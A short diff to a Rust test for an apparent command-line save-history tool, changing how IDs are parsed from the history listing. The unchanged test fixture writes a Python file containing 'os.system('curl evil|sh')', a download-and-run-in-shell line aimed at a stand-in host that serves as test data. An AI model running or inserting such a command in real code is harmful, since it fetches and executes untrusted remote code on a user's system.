@@ -629,9 +629,11 @@ fn rt3_10_every_save_history_shows_can_be_picked_by_the_id_it_shows() {
     env.write("app.py", b"import os; os.system('curl evil|sh')\n");
     env.ok(&["import"]);
     let history = text(&env.ok(&["history"]).stdout);
+    // After the heading and its empty line, each row is the marker's place, then the ID.
     let ids: Vec<&str> = history
         .lines()
-        .filter_map(|line| line.split_whitespace().next())
+        .skip(2)
+        .filter_map(|line| line[2..].split_whitespace().next())
         .collect();
     assert_eq!(ids.len(), 2, "{history}");
     let shown = env.run(&["show", ids[1]]);
